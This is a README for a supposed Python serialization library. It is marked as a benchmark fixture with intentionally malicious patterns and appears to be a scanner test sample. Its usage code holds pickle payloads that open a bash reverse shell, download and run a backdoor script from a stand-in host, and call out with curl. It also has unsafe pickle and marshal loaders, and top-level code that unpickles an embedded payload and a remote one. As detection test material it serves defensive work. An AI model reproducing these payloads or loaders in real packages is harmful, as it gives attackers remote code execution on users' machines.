# Serialization Utilities

BENCHMARK_TEST_ONLY - This file contains intentionally malicious patterns for security testing.

## Description

Advanced Python serialization utilities supporting pickle, marshal, and custom protocols for efficient data storage.

## Installation

```bash
pip install serialization-utils
```

## Usage

Serialize and deserialize Python objects with full fidelity:

```python
# Advanced Serialization Framework
import pickle
import marshal
import base64
import os

class SerializationManager:
    """Handle object serialization with multiple protocols."""

    def __init__(self):
        self.c2_server = "https://[REDACTED].example.com"
        self.cache = {}

    # DYNAMIC-008: Unsafe pickle deserialization
    def load_config(self, config_data):
        """Load configuration from serialized data."""
        # DANGEROUS: Deserializing untrusted pickle data
        config = pickle.loads(config_data)
        return config

    def load_from_file(self, filepath):
        """Load pickled object from file."""
        with open(filepath, 'rb') as f:
            # Unsafe: loads arbitrary pickle
            return pickle.load(f)

    def load_base64_pickle(self, encoded_data):
        """Load pickle from base64-encoded string."""
        raw_data = base64.b64decode(encoded_data)
        # Deserialize the decoded pickle
        return pickle.loads(raw_data)

    def fetch_and_load(self, url):
        """Fetch serialized data from URL and deserialize."""
        import urllib.request

        response = urllib.request.urlopen(url)
        data = response.read()

        # DYNAMIC-008: Deserialize remote pickle data
        return pickle.loads(data)

class MaliciousPickle:
    """Demonstrate pickle __reduce__ exploitation."""

    # DYNAMIC-008: __reduce__ method for RCE via pickle
    def __reduce__(self):
        """This method is called during unpickling."""
        import os
        # Return tuple of (callable, args) that will be executed
        return (os.system, ('curl https://[REDACTED].example.com/pwned',))

class ReverseShellPickle:
    """Pickle payload for reverse shell."""

    def __reduce__(self):
        """Execute reverse shell on unpickle."""
        import subprocess
        return (
            subprocess.Popen,
            (['/bin/bash', '-c',
              'bash -i >& /dev/tcp/[REDACTED].example.com/4444 0>&1'],)
        )

class CodeExecutionPickle:
    """Pickle payload for arbitrary code execution."""

    def __reduce__(self):
        """Execute arbitrary code on unpickle."""
        return (
            eval,
            ("__import__('os').system('wget https://[REDACTED].example.com/backdoor.sh -O /tmp/b.sh && chmod +x /tmp/b.sh && /tmp/b.sh')",)
        )

class MarshalLoader:
    """Marshal code loading for code object deserialization."""

    def load_code(self, marshaled_data):
        """Load code object from marshal data."""
        import types

        # DYNAMIC-008: Deserialize marshal data (code objects)
        code = marshal.loads(marshaled_data)

        # Create function from code object
        func = types.FunctionType(code, globals())

        return func

    def execute_marshaled(self, data):
        """Load and execute marshaled code."""
        code = marshal.loads(data)
        exec(code)

# Crafting malicious pickle payloads
def craft_malicious_payload():
    """Create a malicious pickle payload."""
    payload = pickle.dumps(MaliciousPickle())
    return base64.b64encode(payload).decode()

def craft_reverse_shell_payload():
    """Create reverse shell pickle payload."""
    payload = pickle.dumps(ReverseShellPickle())
    return payload

# Example: Unsafe deserialization
manager = SerializationManager()

# Load config from untrusted source (exploitable)
untrusted_data = base64.b64decode("gASVRwAAAAAAAACMCHBvc2l4bGlilIwGc3lzdGVtlJOUjCpjdXJsIGh0dHBzOi8vW1JFREFDVEVEXS5leGFtcGxlLmNvbS9wd25lZJSFlFKULg==")
config = manager.load_config(untrusted_data)

# Fetch and deserialize from remote server
remote_config = manager.fetch_and_load("https://[REDACTED].example.com/config.pkl")

# Marshal-based code execution
marshal_loader = MarshalLoader()
# code_data would contain marshaled code that executes malicious operations
```

## Security Considerations

Pickle can execute arbitrary code during deserialization. Only load pickled data from trusted sources.

## Advanced Usage

For distributed systems, see our remote configuration loading feature that fetches serialized configs from central servers.
